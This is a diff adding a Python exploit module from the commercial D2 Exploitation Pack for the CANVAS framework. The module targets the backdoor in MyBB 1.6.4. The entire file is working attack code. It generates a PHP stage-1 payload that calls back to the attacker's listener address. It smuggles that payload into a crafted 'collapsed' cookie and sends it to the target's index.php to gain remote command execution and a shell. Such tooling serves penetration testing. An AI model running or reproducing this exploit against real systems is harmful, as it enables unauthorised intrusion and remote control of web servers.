@@ -1,0 +1,101 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2011
+#
+
+import sys, time, os, re
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from ExploitTypes.phpexploit import *
+import StringIO
+import urllib
+
+NAME = "d2sec_mybb_backdoor.py"
+VERSION = "0.1"
+DESCRIPTION = "MyBB Backdoor Arbitrary Command Execution"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "1.6.4"
+DOCUMENTATION["Date public"] = "2011/10/06"
+DOCUMENTATION["References"] = "http://blog.mybb.com/2011/10/06/1-6-4-security-vulnerabilit/"
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["CVE Url"] = ""
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ''
+    self.port = 80 
+    self.uri = '/index.php'
+    self.name = NAME
+	
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port",self.port))
+    self.uri = self.argsDict.get("uri",self.uri)
+
+  def neededListenerTypes(self):
+    return [canvasengine.PHPMULTI]
+
+  def get_php_to_mosdef(self):
+    localhost = self.callback.ip
+    localport = self.callback.port
+    self.log('[D2] Using PHPMULTI callback of %s:%d' % (localhost,localport))
+    badchars = '' 
+    return get_php_stage1(badchars, localhost, localport)
+
+  def create_cookie(self):
+    cmd = self.get_php_to_mosdef()
+    cmd = urllib.quote_plus(cmd)
+    cookie = "collapsed=0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21|22|"
+    cookie += cmd
+    return cookie
+
+  def run(self):
+    self.getargs()
+    self.setInfo('[D2] %s attacking %s:%d' % (NAME,self.host,self.port))
+    content = StringIO.StringIO()
+    try:
+      import pycurl
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      self.log('[D2] Install module python-pycurl')
+      return ''
+    try:
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, 'http://%s/%s' % (self.host, self.uri))
+      c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+      c.setopt(pycurl.COOKIE, self.create_cookie())
+      c.perform()
+      c.close()
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      return 1
+    data = content.getvalue()
+    content.close()
+    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    return 1
+
+  def usage(self):
+    print "Usage: "+sys.argv[0]+" -t target [-p port:80] -O uri:<path>" 
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
